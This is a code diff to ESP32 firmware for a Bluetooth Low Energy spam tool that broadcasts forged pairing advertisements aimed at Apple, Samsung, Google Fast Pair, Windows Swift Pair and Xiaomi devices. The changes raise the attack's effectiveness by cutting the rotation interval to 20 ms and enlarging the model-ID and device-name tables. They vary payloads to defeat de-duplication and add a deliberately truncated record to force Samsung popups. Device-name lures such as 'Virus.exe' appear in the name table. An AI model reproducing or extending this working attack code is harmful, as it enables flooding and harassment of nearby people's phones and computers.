@@ -22,6 +22,7 @@
 #include "ble_scanner.h"
 #include "ble_spectrum.h"
 #include "wifi_spam.h"
+#include "transport_ble.h"
 
 static const char *TAG = "ble_spam";
 
@@ -35,9 +36,10 @@ static const char *TAG = "ble_spam";
 #define ADV_INTERVAL_MIN     0x20   /* 20 ms = hardware min legacy */
 #define ADV_INTERVAL_MAX     0x20
 
-#define DWELL_MS_MIN         250    /* minimum dwell per payload */
+#define DWELL_MS_MIN         20     /* min dwell/rotation — matches Flipper 20ms */
 #define DWELL_MS_MAX         1000
 #define DWELL_CHUNK_MS       50     /* responsive stop */
+#define FAIL_RECOVER_N       3      /* consecutive failures → reconfigure instance */
 
 #define SLOT_MS              2000   /* android/all switching slot */
 
@@ -144,48 +146,155 @@ static const uint8_t apple_pp_prefixes[] = { 0x07, 0x01, 0x05 };
 #define APPLE_PP_PREFIXES_N (sizeof(apple_pp_prefixes))
 
 /* ============================================================
- * Samsung EasySetup — VERIFIED 28-byte payload
- * (byte 0x46 pada posisi 17 WAJIB ada — ini yang hilang sebelumnya)
+ * Samsung EasySetup — Buds color table (R,G,B per index).
+ * Builder appends the truncated 2nd manufacturer record (10 FF 75) that
+ * Android's Galaxy Wearable stack needs to raise the popup. Per-index color
+ * variation defeats de-duplication. (Source: tested Flipper reference.)
  * ============================================================ */
-static const uint8_t SAMSUNG_BUDS_2_PRO_PAYLOAD[] = {
-    0x1B, 0xFF, 0x75, 0x00,
-    0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21,
-    0x01, 0x09, 0xAB, 0x0C, 0x01, 0x46, 0x06, 0x3C, 0xDD,
-    0x0A, 0x00, 0x00, 0x00, 0x00, 0xA7, 0x00
+typedef struct { uint8_t r, g, b; } samsung_color_t;
+
+static const samsung_color_t SAMSUNG_BUDS_COLORS[] = {
+    {0xEE,0x7A,0x0C},{0x9D,0x17,0x00},{0x39,0xEA,0x48},{0xA7,0xC6,0x2C},
+    {0x85,0x01,0x16},{0x3D,0x8F,0x41},{0x3B,0x6D,0x02},{0xAE,0x06,0x3C},
+    {0xB8,0xB9,0x05},{0xEA,0xAA,0x17},{0xD3,0x07,0x04},{0x9D,0xB0,0x06},
+    {0x10,0x1F,0x1A},{0x85,0x96,0x08},{0x8E,0x45,0x03},{0x2C,0x67,0x40},
+    {0x3F,0x67,0x18},{0x42,0xC5,0x19},{0xAE,0x07,0x3A},{0x01,0x17,0x16},
+    {0x12,0x34,0x56},{0x65,0x43,0x21},{0x78,0x9A,0xBC},{0xDE,0xF1,0x23},
+    {0x45,0x67,0x89},{0xAB,0xC1,0x23},{0x32,0x16,0x54},{0x98,0x76,0x54},
+    {0x65,0x49,0x87},{0x32,0x19,0x87},
 };
-#define SAMSUNG_BUDS_2_PRO_LEN (sizeof(SAMSUNG_BUDS_2_PRO_PAYLOAD))
+#define SAMSUNG_BUDS_N (sizeof(SAMSUNG_BUDS_COLORS) / sizeof(SAMSUNG_BUDS_COLORS[0]))
 
 static const uint8_t SAMSUNG_WATCH_IDS[] = {
     0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
     0x0A, 0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
-    0x18, 0xE4, 0xE5, 0x1B, 0x1C, 0x1D, 0x1E, 0x20, 0xEC, 0xEF,
+    0x18, 0x1B, 0x1C, 0x1D, 0x1E, 0x20, 0x21, 0x22, 0x23, 0x24,
+    0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x30, 0x31, 0x32, 0x33,
+    0x34, 0x35, 0x40, 0x41, 0x42, 0x60, 0x61, 0x62,
 };
 #define SAMSUNG_WATCH_N (sizeof(SAMSUNG_WATCH_IDS))
 
 /* ============================================================
- * Google Fast Pair model IDs
+ * Google Fast Pair model IDs (3-byte, big-endian when emitted).
+ * Large table so Android keeps seeing fresh model IDs instead of
+ * de-duplicating after the first few. (Source: tested Flipper reference.)
  * ============================================================ */
-static const uint8_t FASTPAIR_MODELS[][3] = {
-    {0x00,0x00,0x47}, {0x00,0x01,0xF0}, {0xCD,0x82,0x56},
-    {0x92,0xBB,0xBD}, {0x00,0x00,0x06}, {0x71,0x8F,0xA4},
-    {0xD4,0x46,0xA7}, {0x2D,0x7A,0x23}, {0x0E,0x30,0xC3},
-    {0x72,0xEF,0x8D}, {0x72,0xFB,0x00}, {0xF5,0x24,0x94},
-    {0x82,0x1F,0x66}, {0x05,0x77,0xB1}, {0x05,0xA9,0xBC},
+static const uint32_t FASTPAIR_MODELS[] = {
+    0x72EF8D, 0x0E30C3, 0x00000D, 0x000007, 0x070000, 0x000008, 0x080000,
+    0x000009, 0x090000, 0x00000B, 0x0A0000, 0x0B0000, 0x0C0000, 0x060000,
+    0x000048, 0x000049, 0x480000, 0x490000, 0x000035, 0x350000, 0x001000,
+    0x002000, 0x003000, 0x003001, 0x470000, 0xF00000, 0xF00400, 0x003B41,
+    0x003D8A, 0x005BC3, 0x008F7D, 0x00A168, 0x00AA48, 0x00AA91, 0x00B727,
+    0x00C95C, 0x00FA72, 0x0100F0, 0x011242, 0x013D8A, 0x01AA91, 0x01C95C,
+    0x01E5CE, 0x01EEB4, 0x0200F0, 0x02AA91, 0x02C95C, 0x02D815, 0x02E2A9,
+    0x035754, 0x035764, 0x038B91, 0x038F16, 0x039F8F, 0x03AA91, 0x03B716,
+    0x03C95C, 0x03C99C, 0x03F5D4, 0x045754, 0x045764, 0x04AA91, 0x04C95C,
+    0x050F0C, 0x052CC7, 0x0577B1, 0x057802, 0x0582FD, 0x058D08, 0x05A963,
+    0x05A9BC, 0x05AA91, 0x05C95C, 0x06AE20, 0x06C197, 0x06C95C, 0x06D8FC,
+    0x0744B6, 0x07A41C, 0x07C95C, 0x07F426, 0xF00200, 0x0102F0, 0xF00201,
+    0x0202F0, 0xF00202, 0x0302F0, 0xF00203, 0x0402F0, 0xF00204, 0x0502F0,
+    0xF00205, 0x0602F0, 0xF00206, 0x0702F0, 0xF00207, 0x0802F0, 0xF00208,
+    0xF00209, 0xF0020A, 0xF0020B, 0xF0020C, 0xF0020D, 0xF0020E, 0xF0020F,
+    0xF00210, 0xF00211, 0xF00212, 0xF00213, 0xF00214, 0xF00215, 0x02D886,
+    0x02DD4F, 0x02F637, 0x038CC7, 0x04ACFC, 0x04AFB8, 0x054B2D, 0x05C452,
+    0x0660D7, 0xF00300, 0x0003F0, 0xF00301, 0x0103F0, 0xF00302, 0x0203F0,
+    0xF00303, 0x0303F0, 0xF00304, 0x0403F0, 0xF00305, 0x0503F0, 0xF00306,
+    0x0603F0, 0xF00307, 0x0703F0, 0xF00308, 0x0803F0, 0xF00309, 0x0903F0,
+    0x7C6CDB, 0x005EF9, 0xE2106F, 0xB37A62, 0xCD8256, 0xF52494, 0x718FA4,
+    0x821F66, 0x92BBBD, 0xD446A7, 0x2D7A23, 0x72FB00, 0x00000A, 0x0001F0,
+    0x000047, 0x000006, 0x0000F0, 0x0003F0, 0xDAE096, 0xA83C10, 0x9B7339,
+    0x202B3D, 0x02D815, 0x1EE890, 0xE6E771, 0xCAB6B8, 0x9C3997, 0x9939BC,
+    0xD7102F, 0xCA7030, 0x05AA91, 0x91AA05, 0x03AA91, 0x91AA03, 0x02AA91,
+    0x91AA02, 0x038F16, 0x00AA91, 0x91AA00, 0xD6E870, 0x04AA91, 0x91AA04,
+    0x01AA91, 0x91AA01, 0x109201, 0xDF271C, 0x532011, 0xDA5200, 0x0052DA,
+    0x124366, 0x8D13B9, 0x1F5865, 0x641630, 0x8E5550, 0x21521D, 0xA7E52B,
+    0xDF9BA4, 0x5BACD6, 0x8A31B7, 0xDADE43, 0x013D8A, 0x8A3D01, 0x8A3D00,
+    0x003D8A, 0xD7E3EB, 0x0F0993, 0x213C8C, 0xDEE8C0, 0x9CE3C7, 0x994374,
+    0x0DEC2B, 0xC7A267, 0x5CEE3C, 0x915CFA, 0x89BAD5, 0x8E1996, 0xA8CAAD,
+    0x8D16EA, 0x9D7D42, 0xE4E457, 0x99F098, 0x8C4236, 0x9B9872, 0xDAD3A6,
+    0x6BA5C3, 0x8C07D2, 0xDA4577, 0x8B0A91, 0xD5A59E, 0x9171BE, 0xC79B91,
+    0xE750CE, 0xC8777E, 0xCAF511, 0xA8001A, 0xA7EF76, 0xD933A7, 0xC85D7A,
+    0xA8F96D, 0x6C4DE5, 0x8CB05C, 0xC6936A, 0xA8A72A, 0xC7D620, 0xDFD433,
+    0xE69877, 0x9B735A, 0xD9414F, 0x664454, 0xA8E353, 0xE09172, 0x0F232A,
+    0x5BD6C9, 0x5C0C84, 0x9BC64D, 0x9C98DB, 0xA9394A, 0xA8C636, 0xCC5F29,
+    0xD9964B, 0x9C0AF7, 0xC7FBCC, 0xA92498, 0x549547, 0xC9836A, 0xD654CD,
+    0x9CF08F, 0x8AADAE, 0x8CAD81, 0x91BD38, 0x9AEEA4, 0xD6C195, 0x9CD0F3,
+    0x5C4A7E, 0xDB8AC7, 0x92255E, 0x625740, 0x8E14D7, 0x917E46, 0x861698,
+    0x1F181A, 0x9C6BC0, 0xC8162A, 0xE06116, 0xCCBB7E, 0xD8058C, 0x596007,
+    0x9A408A, 0xD5B5F7, 0x0DC6BF, 0x855347, 0xA8A00E, 0x6B9304, 0x8BB0A0,
+    0x8E4666, 0xE57363, 0x8BF79A, 0xE07634, 0x6B8C65, 0xA8845A, 0x21A04E,
+    0x614199, 0x99D7EA, 0xD65F4E, 0xC7736C, 0x0ECE95, 0x8D5B67, 0x8B66AB,
+    0x9ADB11, 0xC8E228, 0xD87A3E, 0x567679, 0x284500, 0xE6E8B8, 0x8C6B6A,
+    0x8CD10F, 0xD8F4E8, 0xD5C6CE, 0xD6EE84, 0xA8658F, 0x989D0A, 0xE64CC6,
+    0x5CC938, 0x5CC939, 0x5CC93A, 0x5CC93B, 0x5CC91E, 0x5CC91F, 0x5CC920,
+    0x5CC921, 0x5CC922, 0x5CC923, 0x5CC924, 0x5CC925, 0x5CC926, 0x5CC927,
+    0x0DC95C, 0x5CC90A, 0x5CC90B, 0x5CC90C, 0x5CC90D, 0x706908, 0x837980,
+    0x5CC932, 0x5CC933, 0x5CC934, 0x5CC935, 0x5CC936, 0x5CC937, 0x5CC928,
+    0x5CC929, 0x5CC92A, 0x5CC92B, 0x5CC92C, 0x5CC92D, 0x5CC92E, 0x5CC92F,
+    0x5CC930, 0x5CC931, 0x5CC93C, 0x5CC93D, 0x5CC93E, 0x5CC93F, 0x5CC940,
+    0x5CC941, 0x5CC942, 0x5CC943, 0x5CC944, 0x5CC945, 0x0EC95C, 0x5CC90E,
+    0x5CC90F, 0x5CC910, 0x5CC911, 0x5CC912, 0x5CC913, 0x5CC914, 0x5CC915,
+    0x5CC916, 0x5CC917, 0x5CC918, 0x5CC919, 0x5CC91A, 0x5CC91B, 0x5CC91C,
+    0x5CC91D, 0xCB529D, 0x9CB881, 0xE020C1, 0xCB2FE7, 0xDEDD6F, 0xDA0F83,
+    0xDF4B02, 0x91DABC, 0xE5B91B, 0x20CC2C, 0xC6EC5F, 0x9CEFD1, 0xC878AA,
+    0xDEC04C, 0xE57B57, 0xCC93A5, 0xDF01E3, 0xDF42DE, 0x9128CB, 0xDE577F,
+    0x6AD226, 0x8B5A7B, 0xD69B2B, 0x6C42C0, 0x997B4A, 0xC6ABEA, 0x5C0206,
+    0x9D00A6, 0xCB093B, 0x8A8F23, 0xE5B4B0, 0xDE215D, 0xC69AFD, 0x0E138D,
+    0x20A19B, 0x5BA9B5, 0xA88B69, 0x5C7CDC, 0x9CB5F3, 0xD8F3BA, 0x0F2D16,
+    0x5C4833, 0x99C87B, 0xDC5249, 0xDEF234, 0x9C888B, 0x9A9BDD, 0xD820EA,
+    0x1E955B, 0x9BE931, 0xDEEA86, 0xD90617, 0xC8C641, 0x612907, 0x913B0C,
+    0x9DB896, 0x8C1706, 0xE5E2E9, 0x00000C, 0x0577B1, 0x05A9BC, 0xDA9B43,
+    0xE6B2D4, 0x9B4B6A, 0xA7C128, 0xB8D241, 0xC9E352, 0xF1A234, 0xD2B345,
 };
-#define FASTPAIR_MODELS_N (sizeof(FASTPAIR_MODELS) / 3)
+#define FASTPAIR_MODELS_N (sizeof(FASTPAIR_MODELS) / sizeof(FASTPAIR_MODELS[0]))
 
 /* ============================================================
- * Swift Pair names
+ * Swift Pair names — normal devices + headphone variant.
+ * Larger pool so Windows keeps raising the "Add a device" toast
+ * instead of de-duplicating by name. (Source: tested Flipper reference.)
  * ============================================================ */
 static const char *SWIFTPAIR_NAMES[] = {
-    "Surface Keyboard",       "Surface Precision Mouse", "Surface Headphones",
-    "Surface Earbuds",        "Surface Pen",             "Surface Mobile Mouse",
-    "Arc Mouse",              "Modern Mobile Mouse",     "Surface Dock",
-    "Surface Dial",           "Xbox Wireless Controller","Surface Audio",
-    "Surface Pro",            "Surface Laptop",          "Surface Go",
-    "Bluetooth Keyboard",
+    "Windows Protocol",                     "DLL Missing",
+    "Download Windows 12",                  "Microsoft Bluetooth Keyboard",
+    "Microsoft Arc Mouse",                  "Microsoft Surface Ergonomic Keyboard",
+    "Microsoft Surface Precision Mouse",    "Microsoft Modern Mobile Mouse",
+    "Microsoft Surface Mobile Mouse",       "Microsoft Surface Headphones",
+    "Microsoft Surface Laptop",             "Microsoft Surface Pro",
+    "Microsoft Surface Duo",                "Microsoft Xbox Wireless Controller",
+    "Microsoft Surface Earbuds",            "Microsoft Surface Go",
+    "Microsoft Surface Studio",             "Microsoft Surface Book",
+    "Microsoft Surface Hub",                "Microsoft Surface Pen",
+    "Microsoft Surface Dial",               "Microsoft Surface Slim Pen",
+    "Microsoft Surface Dock",               "Microsoft Surface Thunderbolt Dock",
+    "Microsoft Surface Audio",              "Free VPN",
+    "Your Mom's PC",                        "Your Dad's iPhone",
+    "404 Device Not Found",                 "Blue Screen of Death",
+    "Installing Windows 99...",             "Virus.exe",
+    "Trojan Horse",                         "Neighbor's Wi-Fi",
+    "Pirated Windows",                      "Keyboard for Cats",
+    "Mouse for Dogs",                       "Pizza Delivery Drone",
+    "Smart Fridge",                         "Smart Light Bulb",
+    "RoboVac 3000",                         "Google Eye",
+    "Apple iPot",                           "Samsung Smart Toaster",
+    "PlayStation 10",                       "Xbox Infinite",
+    "Nintendo Switch Pro Max",              "AI Calculator",
+    "Time Travel Watch",                    "Cyber Sock",
+    "USB Breadbox",                         "Bluetooth Fork",
+    "Wi-Fi Toothbrush",                     "Quantum Toaster",
+    "Meme Dispenser",                       "Hello World",
+    "Radio C5 Mouse",                       "Radio C5 Keyboard",
 };
 #define SWIFTPAIR_NAMES_N (sizeof(SWIFTPAIR_NAMES) / sizeof(SWIFTPAIR_NAMES[0]))
+
+static const char *SWIFTPAIR_HP_NAMES[] = {
+    "BT Headset",   "Stereo HP",  "Wireless HP", "Audio HP",   "Music HP",
+    "Sound HP",     "Bass HP",    "BT Audio",    "BT Stereo",  "Air HP",
+    "Mini HP",      "Pro HP",     "Ultra HP",    "Max HP",     "Lite HP",
+    "Neo HP",       "Echo HP",    "Pulse HP",    "Wave HP",    "Noise HP",
+    "Clear HP",     "Prime HP",   "Core HP",     "Flex HP",    "Zoom HP",
+    "Sync HP",      "Nova HP",    "Aura HP",     "Spark HP",   "Radio HP",
+};
+#define SWIFTPAIR_HP_NAMES_N (sizeof(SWIFTPAIR_HP_NAMES) / sizeof(SWIFTPAIR_HP_NAMES[0]))
 
 /* ============================================================
  * Xiaomi MiBeacon codes
@@ -224,7 +333,12 @@ static bool validate_ad(const uint8_t *data, size_t len)
     while (i < len) {
         uint8_t l = data[i];
         if (l == 0) break;
-        if (i + 1 + l > len) return false;
+        if (i + 1 + l > len) {
+            /* Overrun. Tolerated only as a deliberately-truncated trailing
+             * record (e.g. Samsung Buds' 10 FF 75) AFTER at least one complete
+             * element. A first element that overruns is a real builder bug. */
+            return saw_element;
+        }
         saw_element = true;
         i += 1 + l;
     }
@@ -353,12 +467,12 @@ static void stop_all_instances(void)
  * ============================================================ */
 
 /* 31 bytes — Apple Proximity Pair */
-static size_t build_apple_proximity_pair(uint8_t *out)
+static size_t build_apple_proximity_pair(uint8_t *out, uint32_t idx)
 {
-    size_t idx = esp_random() % APPLE_PP_MODELS_N;
-    uint16_t model = apple_pp_models[idx].value;
-    uint8_t colors_count = apple_pp_models[idx].colors_count;
-    uint8_t color = apple_pp_models[idx].colors[esp_random() % colors_count].value;
+    size_t mi = idx % APPLE_PP_MODELS_N;
+    uint16_t model = apple_pp_models[mi].value;
+    uint8_t colors_count = apple_pp_models[mi].colors_count;
+    uint8_t color = apple_pp_models[mi].colors[esp_random() % colors_count].value;
 
     uint8_t prefix = (model == 0x0055 || model == 0x0030)
                      ? 0x05
@@ -384,9 +498,9 @@ static size_t build_apple_proximity_pair(uint8_t *out)
 }
 
 /* 11 bytes — Apple Nearby Action (SourApple) */
-static size_t build_apple_nearby_action(uint8_t *out)
+static size_t build_apple_nearby_action(uint8_t *out, uint32_t idx)
 {
-    uint8_t action = apple_na_actions[esp_random() % APPLE_NA_ACTIONS_N];
+    uint8_t action = apple_na_actions[idx % APPLE_NA_ACTIONS_N];
     uint8_t flags = 0xC0;
     if (action == 0x20 && (esp_random() & 1)) flags--;
     if (action == 0x09 && (esp_random() & 1)) flags = 0x40;
@@ -404,9 +518,9 @@ static size_t build_apple_nearby_action(uint8_t *out)
 }
 
 /* 15 bytes — Samsung Galaxy Watch */
-static size_t build_samsung_watch(uint8_t *out)
+static size_t build_samsung_watch(uint8_t *out, uint32_t idx)
 {
-    uint8_t id = SAMSUNG_WATCH_IDS[esp_random() % SAMSUNG_WATCH_N];
+    uint8_t id = SAMSUNG_WATCH_IDS[idx % SAMSUNG_WATCH_N];
     size_t i = 0;
     out[i++] = 14;
     out[i++] = 0xFF;
@@ -418,47 +532,80 @@ static size_t build_samsung_watch(uint8_t *out)
     return i;  /* 15 */
 }
 
-/* 28 bytes — Samsung Galaxy Buds 2 Pro (verified) */
-static size_t build_samsung_buds(uint8_t *out)
+/* 31 bytes — Samsung Galaxy Buds.
+ * Primary 28-byte Samsung record + a deliberately-truncated 2nd manufacturer
+ * record (10 FF 75): the Galaxy Wearable stack needs that trailer to raise the
+ * popup, and the per-index R/G/B colour defeats de-duplication. */
+static size_t build_samsung_buds(uint8_t *out, uint32_t idx)
 {
-    memcpy(out, SAMSUNG_BUDS_2_PRO_PAYLOAD, SAMSUNG_BUDS_2_PRO_LEN);
-    return SAMSUNG_BUDS_2_PRO_LEN;
+    const samsung_color_t *c = &SAMSUNG_BUDS_COLORS[idx % SAMSUNG_BUDS_N];
+    size_t i = 0;
+    out[i++] = 0x1B; out[i++] = 0xFF; out[i++] = 0x75; out[i++] = 0x00;
+    out[i++] = 0x42; out[i++] = 0x09; out[i++] = 0x81; out[i++] = 0x02;
+    out[i++] = 0x14; out[i++] = 0x15; out[i++] = 0x03; out[i++] = 0x21;
+    out[i++] = 0x01; out[i++] = 0x09;
+    out[i++] = c->r; out[i++] = c->g; out[i++] = 0x01; out[i++] = c->b;
+    out[i++] = 0x06; out[i++] = 0x3C; out[i++] = 0x94; out[i++] = 0x8E;
+    out[i++] = 0x00; out[i++] = 0x00; out[i++] = 0x00; out[i++] = 0x00;
+    out[i++] = 0xC7; out[i++] = 0x00;
+    /* Trailing truncated record (length claims 16, only 2 bytes present) */
+    out[i++] = 0x10; out[i++] = 0xFF; out[i++] = 0x75;
+    return i;  /* 31 */
 }
 
 /* 14 bytes — Google Fast Pair */
-static size_t build_fastpair(uint8_t *out)
+static size_t build_fastpair(uint8_t *out, uint32_t idx)
 {
-    const uint8_t *mid = FASTPAIR_MODELS[esp_random() % FASTPAIR_MODELS_N];
+    uint32_t model = FASTPAIR_MODELS[idx % FASTPAIR_MODELS_N];
 
     size_t n = 0;
     out[n++] = 0x03; out[n++] = 0x03; out[n++] = 0x2C; out[n++] = 0xFE;
     out[n++] = 0x06; out[n++] = 0x16; out[n++] = 0x2C; out[n++] = 0xFE;
-    out[n++] = mid[0]; out[n++] = mid[1]; out[n++] = mid[2];
+    out[n++] = (uint8_t)((model >> 16) & 0xFF);
+    out[n++] = (uint8_t)((model >>  8) & 0xFF);
+    out[n++] = (uint8_t)( model        & 0xFF);
     out[n++] = 0x02; out[n++] = 0x0A;
-    out[n++] = 0x00;
+    out[n++] = (uint8_t)((esp_random() % 120) - 100);   /* random TX power */
     return n;  /* 14 */
 }
 
-/* 7 + name_len bytes — Windows Swift Pair */
-static size_t build_swiftpair(uint8_t *out)
+/* Windows Swift Pair — normal (7 + name) or headphone (16 + name) variant */
+static size_t build_swiftpair(uint8_t *out, uint32_t idx)
 {
-    const char *name = SWIFTPAIR_NAMES[esp_random() % SWIFTPAIR_NAMES_N];
-    size_t name_len = strlen(name);
-    if (name_len > PAD_LEN - 7) name_len = PAD_LEN - 7;
+    uint32_t total = SWIFTPAIR_NAMES_N + SWIFTPAIR_HP_NAMES_N;
+    uint32_t k = idx % total;
     size_t i = 0;
-    out[i++] = (uint8_t)(name_len + 6);
-    out[i++] = 0xFF;
-    out[i++] = 0x06; out[i++] = 0x00;
-    out[i++] = 0x03; out[i++] = 0x00; out[i++] = 0x80;
-    memcpy(out + i, name, name_len); i += name_len;
+
+    if (k < SWIFTPAIR_NAMES_N) {
+        const char *name = SWIFTPAIR_NAMES[k];
+        size_t name_len = strlen(name);
+        if (name_len > PAD_LEN - 7) name_len = PAD_LEN - 7;   /* max 24 */
+        out[i++] = (uint8_t)(name_len + 6);
+        out[i++] = 0xFF;
+        out[i++] = 0x06; out[i++] = 0x00;
+        out[i++] = 0x03; out[i++] = 0x00; out[i++] = 0x80;
+        memcpy(out + i, name, name_len); i += name_len;
+    } else {
+        const char *name = SWIFTPAIR_HP_NAMES[k - SWIFTPAIR_NAMES_N];
+        size_t name_len = strlen(name);
+        if (name_len > PAD_LEN - 16) name_len = PAD_LEN - 16;  /* max 15 */
+        out[i++] = (uint8_t)(name_len + 15);
+        out[i++] = 0xFF;
+        out[i++] = 0x06; out[i++] = 0x00;
+        out[i++] = 0x03; out[i++] = 0x01; out[i++] = 0x80;
+        out[i++] = 0xD7; out[i++] = 0x2F; out[i++] = 0xD2;
+        out[i++] = 0xF4; out[i++] = 0x61; out[i++] = 0xE4;
+        out[i++] = 0x04; out[i++] = 0x04; out[i++] = 0x00;
+        memcpy(out + i, name, name_len); i += name_len;
+    }
     return i;
 }
 
 /* 28 bytes — Xiaomi MiBeacon */
-static size_t build_xiaomi(uint8_t *out)
+static size_t build_xiaomi(uint8_t *out, uint32_t idx)
 {
     uint16_t device_code =
-        XIAOMI_DEVICE_CODES[esp_random() % XIAOMI_DEVICE_CODES_N];
+        XIAOMI_DEVICE_CODES[idx % XIAOMI_DEVICE_CODES_N];
 
     size_t i = 0;
     out[i++] = 0x1B; out[i++] = 0xFF; out[i++] = 0x8F; out[i++] = 0x03;
@@ -476,21 +623,23 @@ static size_t build_xiaomi(uint8_t *out)
 /* ============================================================
  * pick_payload — no padding, exact length only
  * ============================================================ */
-static size_t pick_payload(ble_spam_type_t type, uint8_t *out, size_t out_size)
+static size_t pick_payload(ble_spam_type_t type, uint8_t *out, size_t out_size,
+                           uint32_t idx)
 {
     if (out_size < PAD_LEN) return 0;
     size_t len = 0;
 
     switch (type) {
-        case BLE_SPAM_APPLE_JUICE:      len = build_apple_proximity_pair(out); break;
-        case BLE_SPAM_SOUR_APPLE:       len = build_apple_nearby_action(out);  break;
+        case BLE_SPAM_APPLE_JUICE:      len = build_apple_proximity_pair(out, idx); break;
+        case BLE_SPAM_SOUR_APPLE:       len = build_apple_nearby_action(out, idx);  break;
         case BLE_SPAM_SAMSUNG:
-            if (esp_random() & 1) len = build_samsung_buds(out);
-            else                  len = build_samsung_watch(out);
+            /* Alternate buds/watch deterministically; each walks its own table */
+            if (idx & 1) len = build_samsung_buds(out, idx >> 1);
+            else         len = build_samsung_watch(out, idx >> 1);
             break;
-        case BLE_SPAM_GOOGLE_FASTPAIR:  len = build_fastpair(out);       break;
-        case BLE_SPAM_WINDOWS_SWIFTPAIR: len = build_swiftpair(out);     break;
-        case BLE_SPAM_XIAOMI_MIBEACON:  len = build_xiaomi(out);         break;
+        case BLE_SPAM_GOOGLE_FASTPAIR:  len = build_fastpair(out, idx);   break;
+        case BLE_SPAM_WINDOWS_SWIFTPAIR: len = build_swiftpair(out, idx);  break;
+        case BLE_SPAM_XIAOMI_MIBEACON:  len = build_xiaomi(out, idx);     break;
         default: return 0;
     }
 
@@ -515,6 +664,13 @@ static void ble_spam_task(void *arg)
     uint32_t cycle = 0;
     uint32_t last_log_sec = 0;
     uint32_t dumped_types_mask = 0;
+    uint32_t consec_fail = 0;
+
+    /* Pause NUS advertising so the spam advertiser is not fighting the app's
+     * connectable advert for airtime on the single radio. The active GATT
+     * connection stays up, so the app can still send "blespam stop". */
+    transport_ble_pause_adv();
+    vTaskDelay(pdMS_TO_TICKS(50));   /* let NimBLE settle (mirrors ble_scanner) */
 
     if (!ensure_addr()) {
         vTaskDelay(pdMS_TO_TICKS(500));
@@ -554,7 +710,7 @@ static void ble_spam_task(void *arg)
                  : BLE_SPAM_SAMSUNG;
         }
 
-        size_t len = pick_payload(type, payload_buf, sizeof(payload_buf));
+        size_t len = pick_payload(type, payload_buf, sizeof(payload_buf), cycle);
         if (len == 0) {
             vTaskDelay(pdMS_TO_TICKS(50));
             cycle++;
@@ -571,10 +727,24 @@ static void ble_spam_task(void *arg)
         int rc = transmit_payload(SPAM_INSTANCE, payload_buf, len);
         if (rc == 0) {
             s_cycles_sent++;
-        } else if (s_fail_count < 5) {
-            s_fail_count++;
-            ESP_LOGW(TAG, "transmit rc=%d type=%s len=%u",
-                     rc, ble_spam_type_name(type), (unsigned)len);
+            consec_fail = 0;
+        } else {
+            if (s_fail_count < 5) {
+                s_fail_count++;
+                ESP_LOGW(TAG, "transmit rc=%d type=%s len=%u",
+                         rc, ble_spam_type_name(type), (unsigned)len);
+            }
+            /* Controller may be wedged (e.g. a stop that never clears, leaving a
+             * stale advert with a stale MAC on air → receivers de-dup it). Re-
+             * configure the instance instead of broadcasting it forever. */
+            if (++consec_fail >= FAIL_RECOVER_N) {
+                ble_gap_ext_adv_stop(SPAM_INSTANCE);
+                ble_gap_ext_adv_remove(SPAM_INSTANCE);
+                configure_instance(SPAM_INSTANCE);
+                consec_fail = 0;
+                ESP_LOGW(TAG, "spam instance reconfigured after %d failures",
+                         FAIL_RECOVER_N);
+            }
         }
 
         /* Chunked dwell — task responds to s_running within 50 ms */
@@ -600,6 +770,7 @@ static void ble_spam_task(void *arg)
     vTaskDelay(pdMS_TO_TICKS(20));
 
 exit:
+    transport_ble_resume_adv();   /* restore app advertising on every exit path */
     s_running = false;
     s_task = NULL;
     io_log("blespam: STOPPED cycles=%u\r\n", (unsigned)s_cycles_sent);
@@ -622,7 +793,7 @@ static void ble_spam_selftest(void)
     for (size_t i = 0; i < sizeof(types) / sizeof(types[0]); i++) {
         bool type_ok = true;
         for (int draw = 0; draw < 8 && type_ok; draw++) {
-            size_t len = pick_payload(types[i], buf, sizeof(buf));
+            size_t len = pick_payload(types[i], buf, sizeof(buf), (uint32_t)draw);
             if (len == 0) { type_ok = false; break; }
             if (expected_len[i] != 0 && len != expected_len[i]) {
                 ESP_LOGE(TAG, "selftest: %s len=%u expected=%u",
@@ -733,8 +904,14 @@ uint32_t ble_spam_frames_sent(void) { return s_cycles_sent; }
 
 uint32_t ble_spam_default_delay(ble_spam_type_t type)
 {
-    (void)type;
-    return DWELL_MS_MIN;
+    /* Mirror the app defaults: Apple/Sour rotate fastest, others a touch slower */
+    switch (type) {
+        case BLE_SPAM_APPLE_JUICE:
+        case BLE_SPAM_SOUR_APPLE:
+            return 20;
+        default:
+            return 50;
+    }
 }
 
 const char *ble_spam_type_name(ble_spam_type_t type)
